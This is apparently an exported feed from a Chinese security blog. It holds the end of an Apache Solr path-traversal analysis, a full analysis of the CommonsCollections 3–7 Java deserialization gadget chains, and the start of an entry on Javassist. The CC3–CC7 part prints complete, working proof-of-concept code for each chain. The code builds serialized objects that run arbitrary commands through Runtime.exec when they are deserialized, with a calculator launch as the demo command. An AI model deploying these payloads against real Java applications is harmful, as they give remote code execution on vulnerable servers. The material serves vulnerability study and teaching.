alt=""></p><p>首先在filter下断点，可以看见这里将request，response，chain传入了重写的filter。</p><p>org.apache.solr.servlet.SolrDispatchFilter#getHttpSolrCall<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuqzidu6j31800mmgq1.jpg" alt=""></p><p>其中对一些变量进行了赋值，主要是解析req从中获取core名称，并向req中写入一些属性，初始化一些core相关的参数，检查core在不在corecontainer中，并做一些错误异常抛出的处理，以及得到当前url的action类型。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeusvume8j31q20ciwmw.jpg" alt=""></p><p>后面跟入httpsolrall类的call方法<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuur8rjaj31300teafz.jpg" alt=""><br>继续跟进到init函数中，init中进行初始化的一些解析操作，比如handler、path、action等成员的解析赋值，比如这里的action为PROCESS<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuwresf4j313u0pgwno.jpg" alt=""></p><p>下面根据action的值进入不同的分支中：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpeuy77tisj31d60r04e0.jpg" alt=""><br>进入execute函数中，并继续跟入execute中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev2j6ni2j314m08uq7s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br>跟入hanlderRequest中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev4d0w4dj31ce0eyadb.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""><br>在handleRequestBody中，对commadn进行赋值<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpev6v82lnj31ka0cu10d.jpg" alt=""></p><p>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevbfszbuj316g0gkn1c.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevcptqu4j31l80n40y9.jpg" alt=""><br>基本上都是从SolrParams对象中取值并赋值到DirectoryFileStream对象成员<br>solr/core/src/java/org/apache/solr/handler/ReplicationHandler.java</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevi8w7wwj31760u0tpw.jpg" alt=""><br>将恶意文件读取的参数传入dir.openInput，查看IndexInput类对象in<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpevlh2va4j31m209mdmi.jpg" alt=""></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewm40h1qj31na0jcgq5.jpg" alt=""><br>在6.4.2中添加了如下代码，判断是否存在..，如果存在则会返回403<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewnkpmcfj30po0eygn9.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections 3～7分析</title>
    <link href="http://yoursite.com/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/</id>
    <published>2021-04-05T10:44:01.000Z</published>
    <updated>2021-07-29T05:51:01.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-3-7分析"><a href="#CommonsCollections-3-7分析" class="headerlink" title="CommonsCollections 3~7分析"></a>CommonsCollections 3~7分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看完了CC1和CC2后面的内容都简单的多了，所以就一起分析一下。</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>cc3和cc1和cc2蛮像的，就是cc1+cc2的变种，在cc3中引入了新的类TrAXFilter和InstantiateTransformer。在cc2中是利用InvokeTransform触发newTransFormer进行命令执行的，而在cc3中，则是通过TrAXFilter触发NewTransFormer进行命令执行的。</p><pre><code>public class TrAXFilter extends XMLFilterImpl &#123;    private Templates              _templates;    private TransformerImpl        _transformer;    private TransformerHandlerImpl _transformerHandler;    private boolean _useServicesMechanism = true;    public TrAXFilter(Templates templates)  throws        TransformerConfigurationException    &#123;            _templates = templates;            _transformer = (TransformerImpl) templates.newTransformer();            _transformerHandler = new TransformerHandlerImpl(_transformer);            _useServicesMechanism = _transformer.useServicesMechnism();    &#125;</code></pre><p>我们看见templates这个字段，这个字段是可控的，因此我们只需要通过反射修改templates的内容，再找到一个点，可以将TrAXfilter初始化就可以了。而这里通过反射修改templates和cc2中的一样，下面给出代码：</p><pre><code class="java">    ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);</code></pre><p>那我们又要如何初始化TrAXfilter呢，上面我们提到过InstantiateTransformer，我们来看看它的代码。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8ob76310j31f60kgdkg.jpg" alt=""></p><p>我们只需要将input设置为TrAXfilter，就可以进行初始化了。下面给出POC：</p><pre><code class="java">package cc3;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)        &#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);        handler_constructor.setAccessible(true);        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);        AnnotationInvocationHandler_Constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));            outputStream.writeObject(handler);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8od7mj1hj31ht0u0hdt.jpg" alt=""></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h3 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来看看Poc的样子</p><pre><code class="java">package cc4;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;Poc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        // 创建 static 代码块，并插入代码        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错        // 写入.class 文件        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        // 进入 defineTransletClasses() 方法需要的条件        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        Object[] queue_array = new Object[]&#123;templates,1&#125;;        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><p>我们可以看见cc4点Poc很眼熟啊，就是cc2➕cc3.cc3前半段用了cc1的利用链，这里将利用链改成了cc2的。</p><h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><ul><li>jdk 1.7</li><li>Commons Collections 4.0</li></ul><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在cc1中只要通过LazyMap#get()传递任意内容就可以触发命令执行。cc5中利用到的是TiedMapEntry这个类。我们跟进去看看。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qjb610qj30zu02g3ze.jpg" alt=""></p><p>跟入TiedMapEntry#toString的getValue中看看。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qt9x7mkj30oa06edgc.jpg" alt=""><br>这里调用了get，我们先来试试看可否执行命令：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8qvqhivlj31hi0osau5.jpg" alt=""><br>所以现在我们就要寻找什么地方调用了toString这个函数，而在cc5中用到的是这个函数BadAttributeValueExpException<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8r0cj9snj30ss072wf9.jpg" alt=""><br>我们通过寻找网上的Poc都是通过反射的反射修改val值的，但是其实这里并不需要这么做<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8r98qobbj317i0niq6i.jpg" alt=""><br>通过阅读上面的代码，虽然这里的val是private属性，然而BadAttributeValueExpException却是public。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8rcfwwrvj315x0u0h6q.jpg" alt=""></p><p>所以我们直接调用就可以了</p><blockquote><p>BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</p></blockquote><p>也是可以执行命令的。</p><h3 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h3><p>其实这里是不可以直接调用的,而是需要通过反射。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8rpvqqg5j31920u0awm.jpg" alt=""><br>如图，这里的执行是生成反序列化的时候进行命令执行的，而不是通过读取反序列化时触发，原因是此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。</p><p>下面给出Poc</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;public class cc5 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)&#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        TiedMapEntry tiedmap = new TiedMapEntry(map,123);        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(poc,tiedmap);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc5&quot;));            outputStream.writeObject(poc);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc5&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><h3 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 3.2</li></ul><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在cc6的后半段链使用的是cc1中的链，在cc5，通过对TiedMapEntry#toString方法的调用，触发了TiedMapEntry#getValue，从而触发了LazyMap#get完成后半段的调用。而在cc6中则是通过TiedMapEntry#hashCode触发对TiedMapEntry#getValue的调用：</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp8zdz9d9xj31do068mzd.jpg" alt=""></p><p>现在就来寻找，哪里调用了hashCode()。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90owjx0wj30uk05igm6.jpg" alt=""><br>如上图中的HashMap#hash调用了，而在HashMap#put中则调用了hash方法，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90smpze0j311a0kmjua.jpg" alt=""><br>而此时的key值依旧是不可控的，我们还需要寻找哪里调用了put。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90u1u6nbj30he03eglt.jpg" alt=""><br>此时我们可以构造Poc了。</p><pre><code class="java">package cc6;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;public class cc6 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open  /System/Applications/Calculator.app&quot;&#125;)&#125;);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        TiedMapEntry tiedmap = new TiedMapEntry(map,123);        HashSet hashset = new HashSet(1);        hashset.add(&quot;foo&quot;);        Field field = Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);        field.setAccessible(true);        HashMap hashset_map = (HashMap) field.get(hashset);        Field table = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);        table.setAccessible(true);        Object[] array = (Object[])table.get(hashset_map);        Object node = array[0];        Field key = node.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(node,tiedmap);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc6&quot;));            outputStream.writeObject(hashset);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc6&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp90ntjyqjj310q0g6dm2.jpg" alt=""></p><p>第一个红框处主要是利用反射获取我们的 HashSet 的 map 属性，因为我们要先获取到 map 才能对 map 的 key 进行修改</p><p>第二个红框处则是修改我们 HashMap 中的 key 值为 hashset</p><p>在这里利用反射获取了 HashMap 中的 table 属性，table其实就是hashmap的存储底层，将 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 hashset.(这里抄了木爷的hh)</p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><h3 id="测试环境-3"><a href="#测试环境-3" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>jdk1.7</li><li>Commons Collections 3.2</li></ul><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Poc</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.*;public class cc7 &#123;    public static void main(String[] args) throws Exception &#123;        Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)        &#125;;        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;pp&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;yy&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 2);        Field field =transformerChain.getClass().getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        lazyMap2.remove(&quot;yy&quot;);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc7&quot;));            outputStream.writeObject(hashtable);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc7&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>在cc1中是通过AnnotationInvocationHandler#invoke来触发对恶意代理handler调用其invoke方法从而触发LazyMap#get方法.而cc7中更加的直接，通过AbstractMap#equals来触发对LazyMap#get方法的调用：</p><p>这里的就讲讲为什么要put两次：<br>在第一次调用reconstitutionPut时，会把key和value注册进table中：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp91usp6qnj313a0hyaf4.jpg" alt=""><br>此时由于tab[index]里并没有内容，所以并不会走进这个for循环内，而是给将key和value注册进tab中。在第二次调用reconstitutionPut时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用equals方法。这也是为什么要调用两次put的原因。</p><p>为什么最后要 remove？而且为什么这里 remove(“yy”)</p><p>首先来说一下为什么最后要 remove ，因为在 AbstractMap#equals 这里的 size()等于1，而我们不remove的话 m.size()就为2并且直接返回 false，导致无法进入到后面。那么为什么要 remove(“yy”)，这里我们需要从 writeObject 中进行查看，在生成 payload 时，当我们利用 put 放入的时候会调用 equals，从而也会触发一次 AbstractMap#equals。里面会多出一个yy，如果不去掉，就会进入上面说的 AbstractMap#equals 中的 if 判断那段，从而导致无法进入到我们的出发点。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections 2分析</title>
    <link href="http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/</id>
    <published>2021-04-01T14:16:01.000Z</published>
    <updated>2021-07-29T05:50:59.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-2分析"><a href="#CommonsCollections-2分析" class="headerlink" title="CommonsCollections 2分析"></a>CommonsCollections 2分析</h1><h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>cc2的利用和cc1不同，这里用到了一个新的类库，可以允许开发者添加新的类和方法。下面来看看javassist的API文档的描述。</p><pre><code>The Javassist Core API.Javassist (Java programming assistant) makes bytecode engineering simple. It is a class library for editing bytecode in Java; it enables Java programs to define a new class at runtime and to modify a given class file when the JVM loads it.The most significant class of this package is CtClass. See the description of this class first.To know the version number of this package, type the following command:java -jar javassist.jarIt prints the version number on the console.</code></pre><p>它令java中运行时可以运行一个新的类，并在JVM虚拟机中可以加载它。</p><p>这里我们使用一个实例代码来更好的理解。相关方法可以翻看<a href="https://www.javassist.org/html/javassist/package-summary.html">javassist的API文档</a>。</p><pre><code class="java">import javassist.*;import java.io.IOException;public class test2 &#123;    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name        name.setModifiers(Modifier.PRIVATE);        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));        person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));        //创建无参构造        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);        person.addConstructor(constructor);        //创建有参构造        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数        person.addConstructor(constructor);        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);        printName.setModifiers(Modifier.PUBLIC);        printName.setBody(&quot;System.out.println(name);&quot;);        person.addMethod(printName);        person.writeFile(&quot;./Person&quot;);    &#125;&#125;</code></pre><p>其中这一行不可缺少，String的值必须初始化，否则值有参构造的时候会发生报错。</p><pre><code>person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));</code></pre><p>我在网上并没有搜索到原因，debug也没有跟到，我猜测应该是如果为初始化，name值不会被加载到栈中，$0.name无法搜索到。以上仅个人观点，有错见谅。上面的代码会创建一个class文件。</p><pre><code class="java">public class Person &#123;    private String name = &quot;xiaotan&quot;;    public String getName() &#123;        return this.name;    &#125;    public void setName(String var1) &#123;        this.name = var1;    &#125;    public Person() &#123;    &#125;    public Person(String var1) &#123;        this.name = var1;    &#125;    public void printName() &#123;        System.out.println(this.name);    &#125;&#125;</code></pre><p>既然已经生成了class文件，我们不可避免的会思考到，我们如何调用javassist动态创建到类呢。这里有三个方法：</p><ul><li>通过反射调用</li><li>通过class文件调用</li><li>通过接口调用</li></ul><h3 id="通过反射调用"><a href="#通过反射调用" class="headerlink" title="通过反射调用"></a>通过反射调用</h3><pre><code class="java">public class test2 &#123;    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name        name.setModifiers(Modifier.PRIVATE);        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));        